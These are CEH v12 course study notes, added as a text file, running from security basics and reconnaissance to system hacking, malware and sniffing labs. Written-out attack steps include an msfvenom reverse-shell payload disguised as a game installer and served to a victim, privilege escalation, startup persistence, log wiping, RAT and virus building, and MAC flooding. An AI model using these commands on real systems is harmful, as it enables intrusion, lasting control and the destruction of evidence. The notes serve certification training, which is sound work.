@@ -1,0 +1,1806 @@
+Edureka CEH - 26-11-2022
+
+Introduction about My Self / Edureka
+Introduction to CEH Certification
+
+Pre-Req:- Networking
+		OSI, IP, ARP, DNS, Network Devices and there behaviour
+	  Linux-Commands: https://hackwithbkob.wordpress.com/2018/03/21/basic-linux-commands/
+	  https://ontibaanaadi.blogspot.com/p/hacking-books.html
+
+	  Common Computer Knowledge
+
+Ec-Council
+
+CEH v12
+Certified Ethical Hacker v12
+Level: Beginner 
+Certification which teaches you about basics of various security domains.
+20 Modules. 40 Hours.
+Aim: Knowledge
+Validity : 3Years
+125 MCQ, 70% Accuracy -> Beginner - Intermediate
+
+CPENT / Former ECSA
+Certified Penetration Testing Professional
+Level : Intermediate
+Penetration Testing.
+Aim: Skill
+Validity : 3Years
+2 Online Remotely Proctored Practical Exam, each of 12 Hrs, 70% passing Marks
+Note: Who ever attains above 90% would directly attain LPT Master
+
+LPT-Master
+Licensed Penetration Tester
+Level : Advance
+Aim : Proficient 
+Validity : 2Years
+Practical : Need to compromise atleast 5 machines out of 9 machines within 18(6+6+6) hrs
+
+What CEH is not.
+
+Penetration Testing		// CPENT
+Vulnerability Assessment	// CPENT it teaches VA but not specific into it.
+Security in Defensive		// Offensive	CND
+
+What CEH actually is.
+Beginner level Training which tells you basics of 10 diff security domains.
+Teaches you what a attack / breach is, how it is done and why is it possible.
+
+CEH v12
+20 Modules 
+
+First Six modules tells you about basics of security.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+My Way of Teaching.
+
+Strictly No PPT's
+Start Basics of Security.
+More Lab
+Notepad 		// for defination and basic understanding
+MS Paint / Google Drawing / Jam Board 	// understanding the flow
+Ec-Council's Ilabs, Courseware.
+My Own lab Setup.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Security:
+	Defensive(Blue Team)	// Protects from hackers through building security controls
+	Offensive(Red Team)	// Tries to hack the system and provides the report to the Concern person
+
+Module 1 :- Introduction to Ethical Hacking
+
+What is Hacking ....?
+
+Accessing a protected resource without any authentication / authorization is known as hacking.
+
+Types Of Hackers //
+
+Black Hat : hacker trying to HARM
+White Hat : hacker trying to Protect - Pentester, Security Analyst
+Gray Hat  : hacker trying to do both.
+
+Script Kiddies: just work on tool, with no knowledge on hacking.
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Hacking Phases - General
+1.Pre Exploitation / Information Gathering / Reconnaissance		// Fetching information about the target
+2.Exploitation							// Gaining access on the target / attacking the target
+3.Post Exploitation			// Things to be done after compromising the system / target
+
+Information Gathering
+	Passive Information Gathering
+	Active Information Gathering
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+CEH Hacking Methodology:- For Hacker / Ethical Hackers
+
+Footprinting					//Pre Exploitation -  Passive IG - Through 3rd party Websites - Social Accounts \ 		Tools -  Target = Website / Device accessible through internet 
+Scanning					//Pre Exploitation - Active IG - Target = Computer / Server / Device 					Through Network Ports
+Enumeration					//Pre Exploitation - Active IG - Target = Computer / Server / Device   					Through Network Services
+Vulnerability Analysis				//Pre Exploitation - Active IG - Target = Computer / Server / Device / Website				Through Software components, Tool=Automated Vulnerability Scanners
+System Hacking
+	Gaining Access				//Exploitation - Gain access on the target machine / Control
+	Escalating Privileges			//Post Exploitation - Elevating our access from any user to Highest level user
+	Maintaining Access			//Post Exploitation - Make the machine as slave
+	Clearing Logs				//Post Exploitation - Wipe the logs
+
+Windows
+Guest -> Standard User -> Admin -> NT Authority(H) (System Level User)
+Guest -> Domain User -> Local Admin -> Domain Admin >  NT Authority(H)
+
+Unix
+Guest -> User -> Sudo User* -> Root(H)
+
+~~~~~~~~~~~~~~~~~~~~
+
+Pillars of Security / Basic Elements of Information Security
+
+Confidentiality	(encryption)// Assurance that data is accessible on to those authorized to have access
+
+Integrity	(Hashing) // Trustworthiness of the data / resources in terms preventing improper / unauthorized changes
+
+Availability	(Backups, Proper security mechanisms)// Assurance that systems responsible for delivering / storing / processing is accessible when required by the authorized users.
+
+Authenticity	(1, 2 authentication)// Ensuring the quality of being genuine / Verifying the genuine of a user / client
+
+	Different Type of Authentication:-
+	Username:Password / Security Question				// Some thing you know
+	Access Cards / Swipe Cards / one time password (Mobile/email)	// Some thing you have
+	Biometric							// Some thing you are
+
+Non-Repudation	(Logs)// A guarantee that user cannot deny his activity, every major activity should be logged.
+
+~~~~~~~~~~
+
+Cyber Kill Chain Methodology:- Typically used by Hacking Groups against individual / Organizations
+
+Reconnaissance	- Gather data about target
+Weaponization - Create Malicious payload based on info gathered to hack target
+Delivery - Send payload to vicitim through email / usb / phishing etc
+Exploitation - exploiting code on vicitm system
+Installation - installing malware on victim
+Command & Control - Control victim machine through command & control center
+Actions on Objective - Perform actions to achieve goals
+
+Diamond Model of Intrusion Analysis:-  Identifying the attack after it happend
+Adversary - Who is behind the attack
+Victim - Person / Organization / Network being effected with the attack
+Capabilities - Strategies / Methods / Procedures associated with the attack, Can also be a malware tool
+Infrastructure - The Hardware / software component used by attacker, ex: Vulnerable db leaked all creds
+
+Organizations should follow - Adaptive Security Strategy -> Security Strategies need to implemented by Organizations.
+Protect - Defense in depth Security Strategy - Protect endpoints, Devices, Data , Network (Setting up Firewall / IDS / IPS etc)
+Detect - Continous Threat Monitoring (SOC)
+Respond - Incident Response(Responding to any minor / major security events)
+Predict - Threat Intelligence, Risk & Vulnerability Assessment (Regular assessment and Look forward for attacks that can be initiated)
+
+Risk Management - Analysing What could go wrong in an organization
+
+Risk = Potential Damage that an event may cause
+Threat = Something that can go wrong
+Vulnerability = a loop hole or weakness which exists on a computer, any device, protocol, scripts, program etc.
+Impact = Asset Value / Financial Lose / Reputational Lose
+
+Risk = Threat X Vulnerability x Impact
+
+Consequences = The Severity of a risk event that occurs
+Likelihood = Probablity of risk occuring
+Risk Level = Consequences x Likelihood
+
+Risk Management Phases:-
+Risk Identification - Identifying the sources of risks
+Risk Assessment - Assess the risks likelihood and impact
+Risk Treatment - Implement the appropriate controls on the identified risks
+Risk tracking - Ensure and validate all appropriate controls are implemented and working as expected
+Risk Review - Evaluates the performance of implemented risk management strategies
+
+Incident Handling & Responses:- What Organizations do when any security Incident(breach) happens -
+Preparation - Building & Train Incident response team, Defining rules and Policies, perform audit of resources and assets of value.
+Incident Recording & Assignment - Initial Reporting and recording, raise necessary tickets
+Incident Triage - Identified Security incidents are Analyzed, Validated, Categorized & Prioritized
+Notification - Informing the necessary stake holder, Clients and Third Parties about the identified incident
+Containment - Preventing the spread of infection to other organizational assets, prevent additional damage
+Evidence Gathering & Forensic Analysis - Accumulating all evidences through forensic experts to define the method of attack, 			vulnerabilities exploited, security mechanisms averted, network devices infected and System / applicaitons compromised
+Eradication - Remove/Eliminating the root cause of the incident so that it doesnot similar incidents don't occur again.
+Recovery - Restoring the effected systems, data and other resources through various recovery mechanisms
+Post-Incident Activities -
+	Incident Documentation
+	Incident impact Assessment
+	Reviewing the policies
+	Closing the investigation(Closing the previously opened tickets)
+	Incident disclosure
+
+Information Security Laws & Standards:-
+Payment Card Industry Data Security Standard (PCI DSS) - E-Commerce / Any online financial industry / Dealing with cards
+ISO/IEC(International Organization for Standards) 27001:2013 - Information Security Standard specifing how to Establish, Implement, Maintain,Continually improve security in organizational level
+Health Insurance Portability & Accountability Act (HIPAA) - Aimed for Health Care Agencies, Hospitals
+Sarbanes Oxley Act (SOX-US) 2002 - Protect investors and the public, Corporate disclosures
+The Digital Millennium Copyright Act(DMCA) 1996  - treaties of World Intellectual Property Organization(WIPO) to define legal prohibations
+The Federal Information Security Management Act(FISMA) - Effectiveness of Information security Controls over federal operations
+General Data Protection Regulation(GDPR) 2018 - Most stringent privacy & Security laws globally, majorly related to European people
+Data Protection Act (DPA) 2018 - Data protection law in UK
+Information Technology Act 2000 & 2008 - Indian IT law*
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Agenda for 27-11-2022
+FootPrinting Labs -> Website -> Device present on internet
+Scanning Labs
+
+Domain name, Sub Domains, IP address, DNS names, WHOis, email, Target urls, Techinology used.
+
+Target: eccouncil.org / certifiedhacker.com
+
+Advanced Googling /Google Dorks
+		- Using google for narrowing the search results helpfull for hackers
+		intitle:<keyword>  => display all the webite which has the given keyword in their title
+ 		site:<domain / subdomain> => shows the webpages from specific site / domain / subdomain
+		filetype: <fileextension> gives the requested filetype associated with the given keywords
+		cache:<domain/subdomain> => gives the cached version of the website
+		allinurl: <multiple keywords> -> Gives you the webpages which has your keywords in their url
+		Advanced google query: https://www.exploit-db.com/
+
+Capture Subdomains/ Virtual Hosts /IP address / Workers emails
+		theHarvester -d eccouncil.org -l 200 -b all
+		theHarvester -d <domain> -l <length in pages> -b <search engines>
+
+Info website info through Photon -> url details / Technology of a website
+		Official Link: https://github.com/s0md3v/Photon
+	$git clone https://github.com/s0md3v/Photon.git	-> installation
+		python3 photon.py -u <url> -l 3 -t 200 --wayback
+		python3 photon.py -u <url> -l <level> -t <threads> --wayback
+
+Whois lookup using domain tools
+		whois.domaintools.com
+
+Idenifying Subdomain & DNS Records SecurityTrails -> DNS Records / MX records / Name servers
+		SecurityTrails -> Sign up -> Verify and Fetch data
+		https://securitytrails.com/
+
+Netcraft Subdomain
+https://sitereport.netcraft.com/			// site report
+https://searchdns.netcraft.com/?host=*.wipro.com	// subdomains
+
+EMail Tracing EmailTrackerPro / mailheader.org -> Track the email path / fetch details about the sender
+	Open EMail -> More -> Show original -> Paste into the tool -> submit	
+
+Performing Tracerouting in Windows & Linux
+		tracert -h / traceroute
+	Windows tracert -h <max_hops> <target_IP / Domain>
+	Linux	traceroute <target_IP / Domain>
+		Command that shows what was the path / hop taken from source to destination
+
+Footprinting a target using Recon-ng
+		$recon-ng
+		recon-ng> marketplace install all
+		recon-ng> module search
+		recon-ng> workspaces ->
+			workspaces create <name> -> 
+			workspaces list -> 
+			db insert domains -> <target_domain> -> 
+			show domains
+		recon-ng> modules load brute -> 
+			modules load recon/domains-hosts/brute_hosts -> 
+			run -> 
+		recon-ng> modules load recon/hosts-hosts/reverse_resolve -> 
+			run -> 
+		recon-ng> modules load reporting/html -> 
+			options set FILENAME /home/<username>/Desktop/report.html ->
+			options set CREATOR <Your Name> -> 
+			options set Customer Ec-Council -> 
+			run	
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Scanning:-
+	Port scanning is a process where hacker would scan(lookout) for open ports on the target machine, through which he can fecth various details about the target
+
+Identify whether target machine is up or not
+identify Open Ports
+identify Services running on those open ports
+identify O.S running
+identify Information Leakage	// not traditionally used in port scanner
+identify Vulnerabilities *	// not traditionally used in port scanner
+
+Logical Ports // Non Physcial Port used to communicate with another computer.
+
+Ports used to connect your computer with other computer for a network activity
+65535 Ports
+Sockets => IP:Port
+127.0.0.1:8080	=> traffic
+
+Protocols =>
+
+TCP (Transmission Control Protocol) & UDP (User Datagram Protocol)
+
+SYN	// Synchronization this flag is used to initiate the connection
+ACK	// Acknowledgement used to acknowledge that data is received
+RST	// Reset used to reset the connection.
+FIN	// Finish used to initiate the end of the communication
+URG	// Urgent used to specify the priority of the data during transmission.
+PSH	// Push used to specify the priority of the data to be processed by the CPU.
+
+https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers
+
+1-1023 Well known / Reserved Ports	//few ports standardized for specific services	
+		Ex: HTTP-80,FTP-21,SSH-22,SMTP-25,SMB-445,SNMP-161
+
+1024 - 49151 Vendor Specific Ports / Registered Ports
+		Microsoft 3389 RDP, Mysql 3306, Postgresql 5432. 
+
+49152 - 65535 Dynamic Ports
+
+Command used to check your current network Satistics 
+
+>netstat -ano
+>netstat -abno // admin
+
+Nmap Commands for various scan
+
+Target Specification -> 192.168.0.104 , 192.168.0.1-255, 192.168.0.1/24 , text file with ip address(-iL), domain name
+
+Perform Host Discovery using Nmap
+
+		nmap -sn -PR <IP> 		//-sn disable port scan / Ping scan, -PR arp scan
+		nmap -sn -PU <IP> 		// -PU udp scan
+		nmap -sn -PE <IP> 		// ICMP echo ping scan
+		nmap -sn -PP <IP> 		// ICMP timestamp scan
+		nmap -sn -PM <IP> 		// ICMP address mask scan
+		nmap -sn -PS <IP> 		// TCP Syn PING scan
+		nmap -sn -PA <IP> 		// ACK scan
+		nmap -sn -PO <IP> 		// Ping scan different IP protocol probes to identify host 
+		nmap -sn -Pn <IP>		// No Ping scan
+
+Explore Various Network Scanning techiniques using nmap
+To Check open Ports	
+		nmap <IP>			// Shows open ports
+		nmap -sT -v <IP>		// TCP scan
+		nmap -sS -v <IP>		// Stealth / Half open scan
+		nmap -sX -v <IP>		// Xmas scan - FIN,URG,PSH
+		nmap -sM -v <IP>		// Maimun scan - FIN/ACK
+		nmap -sA -v <IP>		// Ack scan
+		nmap -sU -v <IP>		// UDP scan
+Gather info
+		nmap -sV -v <IP>		// Service Version scan
+		nmap -sC -v <IP>		// Script scan
+		nmap -O -v <IP>			// Operating System Scan
+		nmap -T4 -A -v <IP>		// Aggressive Scan
+		nmap -sl -v <IP>		// Send spoofed source address
+
+Perform OS discovery using NSE
+
+		nmap -T4 -A -v <IP>		// Aggressive Scan
+		nmap -p <ports> <IP>		// for scanning speicific ports
+		nmap -p 1-65535	<IP>		// for scann all ports	
+
+Portscanning with Bypassing Firewall 
+		nmap -f <IP>			// Packets would be fragmented and sent
+		nmap -g <source_port> <IP>	// Specify the source port ex: 80
+		nmap -mtu 8 <IP>		// Maximum Tranmission Unit lower to bypass
+		nmap -sT -Pn --spoof-mac 0 <IP>	// No ping, full connect in tcp, spoofing the mac address
+
+Detect Port Scanning
+	Pc / End User Computers -> IDS / IPS / ex: KF sensor, Snort
+	Entreprise -> SIEM(Security Incident Event Management) tool
+
+Manual Port Scanning using Hping3
+hping3 -S <IP> -p <target_port> -c 5					// TCP port scanning, if SA=open , RA=Closed
+hping3 <IP> --udp --rand-source -p <target_port> --data 500		// UDP port Scanning, No Response = open, ICMP=Closed
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Welcome Back to CEH 
+
+Agenda for 04-12-2022
+
+Enumeration Labs
+Vulnerability Analysis Labs
+System Hacking
+
+1.1 Perform  NetBios Enumeration using windows command-line utilities	- Name of the Computer (Port UDP - 137)
+	
+	nbtscan -r <IP-Range>
+		ex: nbtscan -r 192.168.0.1/24		// Scan the entire range of computers to identify its computer name
+			nbtscan 192.168.0.106
+
+5.1 Perform DNS Enumeration using Zone Transfer	(Port UDP - 53)
+
+	$sudo -s
+	$dig ns <domain>			// ns for name servers => www.certifiedhacker.com
+	$dig @<nameserver> <domain> axfr	// transfer all domain details from the name server
+		ex: dig @ns1.bluehost.com www.certifiedhacker.com axfr
+
+6.1 Perform SMTP enumeration using Nmap (Port TCP - 25)
+
+	$nmap -p 25 --script=smtp-enum-users <IP>(10.10.1.19)		// Gives the list of possible users in the mx server
+	$nmap -p 25 --script=smtp-open-relay <IP>(10.10.1.19)		// check if smtp is an open relay| you can send and receive emails through this server without being authenticated.
+	$nmap -p 25 --script=smtp-commands <IP>(10.10.1.19)		// check available smtp commands
+
+Bonus Tools:-
+	$enum4linux -a <IP>			// Gather overall about linux machine
+
+4.1 Perform NFS enumeration using nmap | showmount | mount - Network File Sharing(Similar Windows shared folder) {Port 2049 & 111}
+	$nmap -p 2049,111 -sV -sC <IP>
+	$showmount -e <IP>
+	$sudo mount -t nfs <IP:<shared drive path>> <target folder>
+		ex: sudo mount -t nfs 192.168.0.104:/ CEH-Share
+	
+
+Other Tools:-
+
+2.3 Perform SNMP enumeration using Snmpwalk
+	
+	$ snmpwalk -v1 -c public <IP>		// Shows the current snmp settings and details using snmp v1
+	$ snmpwalk -v2c -c public <IP>		// Shows the current snmp settings and details using snmp v2c
+
+3.1 Perform LDAP Enumeration using Active Directory Explorer (AD Explorer)
+
+	CEHTools\> ADExplorer.exe -> Connect to (Target) 10.10.1.22(Windows server 2022) -> ok -> Check and verify details
+
+4.1 Perform NFS enumeration using RPCscan and SuperEnum
+
+	Windows 2019 -> Server Manager -> Add roles & features -> Next -> Server Roles -> Expand File and Storage Services -> File & iSCSI Services -> Server for NFS -> Next -> Add Features -> Install -> Close
+
+	Parrot Sec ->$ nmap -p 2049 <IP>
+	$cd SuperEnum 	
+	$echo "<IP address>" > Target.txt
+	$chmod +x superenum
+	$./superenum -> Target.txt
+	$cd ..
+	$cd RPCScan
+	$python3 rpc-scan.py <IP> --rpc
+
+8.1 Enumerate Information using Global network Inventory
+	
+	Windows 11 > gni / Global Network Inventory -> Agree -> Close -> Next -> Single Address Scan -> IP Address(10.10.1.22) -> 
+	Username : Password -> Finish -> Scan Summary -> Computer | Operatin System | BIOS | NetBIOS | User Groups | Services | 
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Module - 5
+
+Vulnerability Scanning
+
+Vulnerability Assessment ,Vulnerability Management
+
+lookout for loopholes or  on your target.
+
+Categories of Vulnerabilities:-
+1. RCE (Remote Code Execution)// any thing but should write code for it.
+2. Command Execution. //only executes command allowed by the o.s for the designated user
+3. DOS (Denial Of Service) // Which blocks the authorized user from accessing it.
+4. Backdoor   // ES file explorer, CCleaner, Cam Scanner
+5. Information disclosure (85%)
+
+In RCE attacker will be able to execute any code on the victim machine without authentication remotely.
+
+Vulnerability Codes
+
+CVE(Common Vulnerability & Exposures):** - Mitre
+CWE(Common Weakeness Enumeration): sans
+MS(Microsoft): its own products vendor
+OSVDB(Open Source Vulnerability Database)
+NVD(National Vulnerability Database) 
+
+apache 2.2.2
+
+CVE 2014-6471 shell shock, linux based webservers in 2014
+CVE 2017-0143 eternal blue. MS17-010 windows 7 through SMB port
+
+Infrastructure / Web App
+
+Nessus (Trial)*		BurpSuite
+Qualys Guard		App spider
+Acunetix		HCL Appscan
+Nexpose 		Acunetix
+OpenVAS	= FREE		OWASP-ZAP - FREE
+
+Exploitation:
+Metasploit	Community free / paid
+Core Impact	Paid
+Canvas		Paid
+
+After a vulnerability is reported:
+
+Fixing can be done.
+Fixing cannot be done
+
+Validating Accuracy of Vulnerability Scanning tool:-
+
+true positives		rightly stating vulnerability exists
+	Tools says vulnerability exists, in reality the vulnerability exists
+true negatives		rightly stating vulnerability doesnot exists
+	Tools says vulnerability doesn't exists, in reality the vulnerability doesn't exists
+false negatives		wrongly stating the vulnerability doesnot exists
+	Tools says vulnerability doesn't exists, in reality the vulnerability exists
+false positives		wrongly stating the vulnerability exists
+	Tools says vulnerability exists, in reality the vulnerability doesn't exists
+
+
+Windows 11 - https://10.10.10.11:8834/ | https://127.0.0.1:8834 	
+ilabs :- nessus creds: admin / password
+ilabs :- Target windows server 2019(10.10.0.19) / Windows server 2022(10.10.0.22)
+
+Windows 8 and Windows Server 2012 = MS17-010 / CVE 2017-0143	Eternal Blue
+
+Creating own Lab Setup(English) :- https://www.youtube.com/watch?v=u_KhEkgjAO0
+Lab on Vulnerability Scanning(Kannada) :- https://www.youtube.com/watch?v=s2ulDSjw_sg
+
+Command to start nessus in linux machine:-
+	$sudo service nessusd start
+	$sudo service nessusd stop
+Target :- Windows 7 , Metasploitable
+
+Reports :-
+Reports -> Report Format = PDF -> System = Detailed vulnerabilities by Host -> Generate Reports
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Module - 6 -> System Hacking
+
+Weakness | Loophole
+
+Exploit :- Code which contains instructions to break the vulnerability and perform the task (execute the code)
+Payload :- Code which contains instructions to perform the task (Connect Hacker & Victim , so that Hacker control the Victim)
+
+Limitations : The Attacker should Globally accessible
+	Port Forwarding for house hold connections
+
+Assignment :-
+	Metasploit Basics :- https://hackwithbkob.wordpress.com/2018/03/21/metasploit-basics/
+
+Labs:- 
+Scenario 1:-
+	1. Create own malware (Malicious Application) {Reverse Shell - establishing communication from victim to attacker}
+	2. Create Listener (A communication/Receiver instance created by the attacker, waiting for incoming victim's connection)		3. Send that malware to the victim (email, file sharing, web download, usb sharing etc) & convince him to run it.
+
+
+Attacker(Kali Linux) IP: 192.168.0.107
+Vicitm(WIndows 7) IP: 192.168.0.105
+
+
+1.4 Exploit Client-Side Vulnerabilities & Establish a VNC Session
+1.  Create a Payload using msfvenom
+
+	$ msfvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -a x64 LHOST=<Attacker_IP> LPORT=4545 -f exe -o /home/kali/pubgforpc.exe 
+		eg: msfvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -a x64 LHOST=192.168.0.107 LPORT=4545 -f exe -o /home/kali/pubgforpc.exe 
+
+3-1. enabling File Sharing using Web download
+
+	$ mkdir /var/www/html/share				// creating a directory by name share
+	$ chmod -R 755 /var/www/html/share			// giving all permisssions to diretory share
+	$ chown -R www-data:www-data /var/www/html/share	// making user www-data the owner of directory share 
+	$ cp /home/kali/pubgforpc.exe /var/www/html/share/	// copying the malware file into directory share	
+	$ service apache2 start					// starting apache2 webserver, so that victim can access the directory share
+
+2. Create a Listener
+
+	$ msfdb init						// initializing msf database
+	$ service postgresql start				// starting postgresql database
+	$ msfconsole						// starting metasploit
+	msf6> use exploit/multi/handler				// importing generic listener code
+	msf6> set payload windows/x64/meterpreter/reverse_tcp	// defining the payload{mode of communication}
+	msf6> set LHOST <Attacker_IP>				// defining the attacker ip / Listener ip
+	msf6> set LPORT 4545					// defining the attacker port / listener port
+	msf6> show options					// check all the provided data
+	msf6> exploit -j -z					// initiate / start listener in background mode / multiple connections can be recieved
+
+3-2 
+	cmd> on windows (Target) Machine open http://<Attack_IP>/share/pubgforpc.exe on any browser ->  downlaod and execute
+		eg: http://192.168.0.107/share/pubgforpc.exe
+
+	msf6> sessions -l					// lists all available connections in background
+	msf6> sessions -i <sessions-id>				// start interacting with the connections
+
+	meterpreter> sysinfo					// fetch the target system's info
+	meterpreter> getuid					// gets as which user you hold the access
+	meterpreter> getprivs					// lists all the privileges the current user has on target machine	
+
+Priveleage Escalation:-
+3 Ways:-
+	Kernel Vulnerabilities
+	Misconfigurations
+	Information Disclosure
+
+	meterpreter> run post/multi/recon/local_exploit_suggester	// check for any kernel exploits / misconfi exploits
+	meterpreter> background						// background existing connections so that new exloit script can be imported and executed
+	msf6> use exploit/windows/local/bypassuac_eventvwr		// importing the exploit for privilege escalation
+	msf6> set SESSION <session-id>					// defining existing session id
+	msf6> set payload windows/x64/meterpreter/reverse_tcp		// defining 64 bit payload
+	msf6> set LHOST 192.168.0.107					// defining listener ip
+	msf6> set LPORT 4546						// defining listerner port
+	msf6> show targets						// checking available targets
+	msf6> set TARGET 1						// defining the right target
+	msf6> show options						// verifying all the set values
+	msf6> exploit							// initiating the attack
+
+	meterpreter> sysinfo					// fetch the target system's info
+	meterpreter> getuid					// gets as which user you hold the access
+	meterpreter> getsystem					// perform user id manupulation and gets into NT-Authority
+	meterpreter> getuid					// gets as which user you hold the access
+	meterpreter> getprivs					// lists all the privileges the current user has on target machine	
+
+For public Network Requirement :-
+	1. Use Public in LHOST instead of private
+	2. Port Forwarding on Attacker side
+
+192.168.0.107 -> public ip 106.51.241.49 no-dns-bkob.com
+Router config
+NAT
+106.51.241.49:4545 -> 192.168.0.107:4545
+Reverse Shell
+
+Static IP / Noip - Nodns - Dynamicdns
+
+Scenario 2:- Compromise a Linux server using RCE (Victim = Metasploitable-2)
+	# nmap -sV -sC <target-ip>
+	Run a vulnerability scanner towards the target ip to get the vulnerabilities existing on the target Machine or 
+	Identify service versions using ports scan -> Google -> search for known vulnerabilities in the version
+	Use metasploit to exploit the machine
+
+	# Service postgresql start
+	# msfconsole
+	msf> use exploit/unix/ftp/vsftpd_234_backdoor
+	msf> show options
+	msf> set RHOSTS <Target-IP>
+	msf> show options
+	msf> exploit
+
+3.6 Maintain persistence by abusing boot or logon autostart execution
+
+	meterpreter> cd "C:\\ProgramData\\Start Menu\\Programs\\Startup\\"		// windows 10 & above
+	meterpreter> cd C:\\Users\\<username>\\Start Menu\\Programs\\Startup\\		// windows 7 above
+			eg: cd "C:\\Users\\windows7\\Start Menu\\Programs\\Startup\\"
+	meterpreter> upload /home/kali/pubgforpc.exe 
+	
+4.2 Clear windows machine logs using various utilities
+
+	meterpreter> clearev	
+	cmd> wevtutil el	// event log
+	cmd> wevtutil cl [application, system, security]	// clear logs specificaly
+	cmd> cipher /w:C:
+
+Gaining Linux machine access using RCE vulnerability:-
+	#nmap -sV -sC <Victim_IP>
+
+4.3 Clear linux machine logs usig the bash shell
+	
+	$ export HISTSIZE=0
+	$ history -c
+	$ shred ~/.bash_history
+	$ rm /var/log/
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Module - 7 -> Malware Threats
+
+Malware:-
+	Is an application which causes harm to the computer
+
+!!! A malware will never cause harm unless it is executed. // alive Bomb
+	Attacker
+Offensive (Create and Hack using Malware)
+	Victim / Malware Analyst
+Static Analysis (Disassemble malware and read through the code)
+Dynamic{Behavioural} Analysis (Run the malware in controlled environment and analyze its behaviour)
+Hybrid Analysis(Combination of Both)
+
+Different Ways that Malware enter a System:-
+	Instant Messanger Applications
+	Portable Hardware / Removable Devices
+	Browser & Email Software Bugs
+	Insecure Patch Management
+	Rogue/Decoy Applications
+	Untrusted Sites & free Web applications
+	Downloading untrusted files from internet
+	Email Attachments
+	Network Sharing
+	Installation by other Malware
+	Bluetooth & Wireless Networks
+
+Components of Malware:-
+	Crypter		// encrypt malware making hard to detect
+	Downloader	// trojans download malwaresr 
+	Dropper		// carriers software that carry malware
+	Exploit		// by abusing a vulnerability
+	Injector	// injects malware code into other process to hide itself
+	obfuscator	// a program that conceals malware in it, so that identifying is difficult
+	Packer		// compression technique to store the malware,  converting it to a unreadable format
+	Payload		// part of malware that performs desired activitiy
+	Malicious Code	// Piece of code that harms a computer
+
+Windows Attacker:- 192.168.0.106
+Windows Victim:- 192.168.0.105
+
+Labs :-
+
+Offensive:-
+
+1.1 Gain Control over a victim machine using the njRAT RAT trojan
+	CEH-Tools\Malware Threats\Trojans Types\Remote Access Trojans\njRAT\
+	1. Create a Malware -> 2. Create a Listener -> 3. Share and convince the victim to execute the malware (Run as Administrator)
+
+2.1 Create a virus using the JPS Virus Maker tool & infect the target system
+	CEH-Tools\Malware Threats\Virus Maker\JPS Virus Maker\ -> name -> enable Auto Startup -> Disable Taskmanager, Hide Window Clock, Hide Desktop Icons, Enable Remote Desktop, Disable Windows Update, Disable Control Panel, Turn off windows Firewall, Turn Off Windows Defender, Disable Drivers. -> None -> Change windows Password -> Chane computer name -> Enable convert to Worm -> icon to jpg -> Type = 64 -> Create
+
+Static-Analysis:-
+
+3.7 Perform Malware Disassembly using IDA and ollydbg
+	Install and open IDA
+	CEH-Tools\Malware Threats\Malware Analysis Tools\Static Malware Analysis Tools\Disassembling & Debugging Tools\
+	Ollydbg
+
+	Sub Process created(Logs) -> Executable modules(Supporting Modules) -> Memory (Memory events)
+
+Dynamic-Analysis:-
+
+Pre-Req:- Create a controlled environment to run the malware
+
+4.1 Perform port monitoring using Currports / TCPView
+		Start NjRAT -> CEH-Tools\Malware Threats\Malware Analysis Tools\Malware Analysis Tools\Dynamic Malware Analysis Tools\Port Monitoring Tools\CurrPorts\ -> cports.exe -> 5552 Port -> right Click -> Properties -> ok -> Kill Process | Close Selected TCP Port
+
+4.2 Perform process monitoring using process monitor	
+		Start NjRAT  -> CEH-Tools\Malware Threats\Malware Analysis Tools\Malware Analysis Tools\Dynamic Malware Analysis Tools\Process Monitoring Tools\Procmon.exe -> Trojan.exe -> Right Click -> Properties -> Event(T) | Process(T) | Stack(T)
+
+Hybrid Analysis:-
+
+3.1 Perform Malware scanning using hybrid analysis
+	https://hybrid-analysis.com/ -> File -> CEH-Tools\Malware Threats\Viruses\tini.exe -> email -> enable robot check -> ok
+	https://virustotal.com/ Static
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Module 8:- Sniffing
+
+	Where attacker will be able to get/find/identify what data was exchanged between two neighbouring computers of the same network.
+
+Advantages:
+Victim is not notified about the attack
+No user interaction required
+Any computing device, irrespective of its operating system can be a victim
+
+Limitations:
+It is only possible on LAN
+It is only possible on Plain text protocol
+
+Vulnerable Protocols:-
+HTTP,Telnet,IMAP,POP,SMTP,FTP,SNMP,etc
+
+Article about Network Elements:-
+https://www.hackwithbkob.com/search/label/Network-Elements
+
+Source address -> Destinations Address
+21	-	24
+AAAA	- 	BBBB
+
+24 	- 	21
+DDDD		BBBB
+
+Hacker  = Kali Linux - 	192.168.0.107 - 46:4F
+Victim1 = Router - 	192.168.0.1   - 8A:B6
+Victim2 = Windows -	192.168.0.106 -	37:39
+
+
+
+Passive Sniffing <HUB>		// attacker is idle watches the traffic flowing
+Active Sniffing <Switch>	// attackers reroutes the path between two victim through the attacker. Also known as Man in the Middle attack, (MITM)
+
+Promiscous Mode.		// NIC to open all the recived packets, irrespective of whether the packet was destine to him or not
+
+ARP Address Resolution Protocol	// ARP thinks latest info is the accurate info
+IP to Mac // Dynamically Populated.
+ARP Cache updates it contents based on recent data 
+ARP Cache is dynamically populated
+
+2 Types of Active Sniffing
+MAC flooding		// send fake mac packets to make switch to work as hub
+DHCP Starvation		// continously sending dhcp request 
+ARP Poisoning | IP forwarding	// ARP poisoning to perform MITM attack
+
+Labs:- 
+
+1.1 Perform MAC flooding using macof -> {to Make switch to work as hub}
+	1. Open Wireshark 
+	2. macof -i eth0 -d <ipaddress of neighbouring computer> -n 30			// flooding CAM table using random MAC addresses
+	3. Observer mac address in the wireshark 
+
+1.2 Perform a DHCP starvation attack using Yersinia
+	1. Open Wireshark
